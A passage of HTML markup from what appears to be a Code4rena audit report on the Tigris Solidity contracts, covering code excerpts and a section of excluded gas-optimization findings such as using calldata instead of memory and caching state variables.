class=\"mtk8\">&quot;!Protocol&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L22</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"185\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">isMinter</span><span class=\"mtk1\">[</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()], </span><span class=\"mtk8\">&quot;!Minter&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L52</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"186\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">56</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">ERC20Permit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">permit</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_toAllow</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_deadline</span><span class=\"mtk1\">, </span><span class=\"mtk12\">v</span><span class=\"mtk1\">, </span><span class=\"mtk12\">r</span><span class=\"mtk1\">, </span><span class=\"mtk12\">s</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20Mintable</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stable</span><span class=\"mtk1\">).</span><span class=\"mtk11\">burnFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:               </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(),</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L46</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"187\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LimitOrderExecuted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">direction</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">margin</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">_fee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">554</span><span class=\"mtk1\">:              </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PositionLiquidated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">584</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">proxyApprovals</span><span class=\"mtk1\">[</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()] = </span><span class=\"mtk10\">Proxy</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">631</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">PositionClosed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_percent</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_toMint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_isBot</span><span class=\"mtk1\"> ? </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() : </span><span class=\"mtk12\">_trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">trader</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">722</span><span class=\"mtk1\">:                      </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">798</span><span class=\"mtk1\">:                      </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">885</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_trader</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">887</span><span class=\"mtk12\">:</span><span class=\"mtk1\">              </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">() &amp;&amp; </span><span class=\"mtk12\">_proxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">time</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Proxy not approved&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L520</p>\n<hr>\n<h2 id=\"excluded-gas-optimization-findings\" style=\"position:relative;\"><a href=\"#excluded-gas-optimization-findings\" aria-label=\"excluded gas optimization findings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excluded Gas Optimization Findings</h2>\n<p>These findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑23]</td>\n<td align=\"left\">Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</td>\n<td align=\"center\">12</td>\n<td align=\"center\">1440</td>\n</tr>\n<tr>\n<td>[G‑24]</td>\n<td align=\"left\">State variables should be cached in stack variables rather than re-reading them from storage</td>\n<td align=\"center\">20</td>\n<td align=\"center\">1940</td>\n</tr>\n<tr>\n<td>[G‑25]</td>\n<td align=\"left\"><code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</td>\n<td align=\"center\">13</td>\n<td align=\"center\">39</td>\n</tr>\n<tr>\n<td>[G‑26]</td>\n<td align=\"left\">Using <code>bool</code>s for storage incurs overhead</td>\n<td align=\"center\">16</td>\n<td align=\"center\">273600</td>\n</tr>\n<tr>\n<td>[G‑27]</td>\n<td align=\"left\">Using <code>> 0</code> costs more gas than <code>!= 0</code> when used on a <code>uint</code> in a <code>require()</code> statement</td>\n<td align=\"center\">1</td>\n<td align=\"center\">6</td>\n</tr>\n<tr>\n<td>[G‑28]</td>\n<td align=\"left\"><code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</td>\n<td align=\"center\">21</td>\n<td align=\"center\">105</td>\n</tr>\n<tr>\n<td>[G‑29]</td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">3</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑30]</td>\n<td align=\"left\">Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</td>\n<td align=\"center\">64</td>\n<td align=\"center\">-</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 150 instances over 8 issues with <strong>277130 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g23--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" style=\"position:relative;\"><a href=\"#g23--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\" aria-label=\"g23  using calldata instead of memory for read only arguments in external functions saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑23]  Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</h2>\n<p>When a function with a <code>memory</code> array is called externally, the <code>abi.decode()</code> step has to use a for-loop to copy each index of the <code>calldata</code> to the <code>memory</code> index. <strong>Each iteration of this for-loop costs at least 60 gas</strong> (i.e. <code>60 * &#x3C;mem_array>.length</code>). Using <code>calldata</code> directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having <code>memory</code> arguments, it’s still valid for implementation contracs to use <code>calldata</code> arguments instead. </p>\n<p>If the array is passed to an <code>internal</code> function which passes the array to another internal function where the array is modified and therefore <code>memory</code> is used in the <code>external</code> call, it’s still more gass-efficient to use <code>calldata</code> when the <code>external</code> function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one</p>\n<p>Note that I’ve also flagged instances where the function is <code>public</code> but can be marked as <code>external</code> since it’s not called by the contract, and cases where a constructor is involved</p>\n<p><em>There are 12 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"188\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _destination - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit tokenId - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">crossChain</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">125           </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_dstChainId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">126           </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_destination</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">127           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">128:          </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _srcAddress - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _payload - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">       </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">lzReceive</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">169</span><span class=\"mtk1\">           </span><span class=\"mtk10\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_srcChainId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">           </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_srcAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">           </span><span class=\"mtk10\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_nonce</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">172</span><span class=\"mtk1\">:          </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_payload</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L124-L128</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"189\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _ids - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sendNFTs</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">139           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ids</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">140:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">() {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L138-L140</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"190\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _name - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">48</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_chainlinkFeed</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxLeverage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_feeMultiplier</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_baseFundingRate</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"191\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _newBaseURI - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">85</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBaseURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newBaseURI</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _mintTrade - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">132           </span><span class=\"mtk12\">MintTrade</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mintTrade</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">133:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyMinter</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L85</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"192\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Referrals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _codeOwners - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _ownedCodes - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _referredA - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit _referredTo - (valid but excluded finding)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">initRefs</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">61            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_codeOwners</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">62            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ownedCodes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">63            </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_referredA</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">64            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_referredTo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">65:       ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Referrals.sol#L60-L65</p>\n<h2 id=\"g24--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" style=\"position:relative;\"><a href=\"#g24--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\" aria-label=\"g24  state variables should be cached in stack variables rather than re reading them from storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑24]  State variables should be cached in stack variables rather than re-reading them from storage</h2>\n<p>The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (<strong>100 gas</strong>) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.</p>\n<p><em>There are 20 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"193\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 